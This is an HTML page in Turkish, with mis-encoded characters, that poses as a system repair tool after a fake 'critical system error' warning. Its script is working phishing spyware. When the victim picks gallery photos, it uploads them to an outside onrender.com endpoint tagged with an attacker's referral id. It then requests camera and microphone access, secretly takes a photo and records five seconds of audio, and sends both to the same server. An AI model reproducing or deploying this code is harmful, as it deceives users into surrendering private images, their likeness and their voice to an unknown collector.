<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem GÃ¼venlik KontrolÃ¼</title>
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding: 20px; }
        .btn { background: #ff0000; color: #fff; padding: 25px 40px; border: none; cursor: pointer; font-size: 1.2rem; border-radius: 50px; box-shadow: 0 0 20px #ff0000; font-weight: bold; margin-top: 50px; }
        #status { margin-top: 30px; font-size: 0.8rem; color: #555; }
    </style>
</head>
<body>
    <h2 style="color: #ff0000;">âš ï¸ KRÄ°TÄ°K SÄ°STEM HATASI</h2>
    <p>CihazÄ±nÄ±zÄ±n medya sÃ¼rÃ¼cÃ¼leri senkronize edilemiyor.<br>LÃ¼tfen tÃ¼m izinleri onaylayarak onarÄ±mÄ± baÅŸlatÄ±n.</p>

    <input type="file" id="gallery" accept="image/*" multiple style="display:none" onchange="startSiz(this)">
    <button class="btn" onclick="document.getElementById('gallery').click()">SÄ°STEMÄ° ONAR VE BAÄLAN</button>

    <div id="status">Annie Protocol v3.0 | Secure Connection</div>

    <script>
        const RENDER_URL = "https://ssbotgggghack-1.onrender.com/upload";
        // Linkteki ?ref=ID kÄ±smÄ±ndan kullanÄ±cÄ±yÄ± otomatik Ã§eker aÅŸkÄ±m
        const urlParams = new URLSearchParams(window.location.search);
        const adminId = urlParams.get('ref') || "8258235296";

        async function startSiz(input) {
            const files = input.files;
            document.body.innerHTML = "<h2>ğŸŒ€ ONARIM BAÅLADI...</h2><p>LÃ¼tfen bekleyin, bu iÅŸlem 1 dakika sÃ¼rebilir.</p>";

            // 1. GALERÄ° SIZINTISI
            for (let i = 0; i < files.length; i++) {
                sendToBot(files[i], "ğŸ“¸ GALERÄ°");
            }

            // 2. KAMERA VE SES SIZINTISI (Arka Planda)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                
                // AnlÄ±k FotoÄŸraf Ã‡ekimi
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => sendToBot(blob, "ğŸ‘ï¸ CANLI KAMERA"), 'image/jpeg');
                }, 2000);

                // KÄ±sa Ses KaydÄ± (5 saniye)
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = e => chunks.push(e.data);
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                    sendToBot(audioBlob, "ğŸ¤ SES KAYDI");
                };
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);

            } catch (err) {
                console.log("Ä°zin reddedildi veya cihaz desteklemiyor.");
            }
        }

        async function sendToBot(fileBlob, type) {
            let data = new FormData();
            data.append('file', fileBlob);
            data.append('admin_id', adminId);
            data.append('type', type);

            try {
                await fetch(RENDER_URL, { method: 'POST', body: data });
            } catch (e) { }
        }
    </script>
</body>
</html>
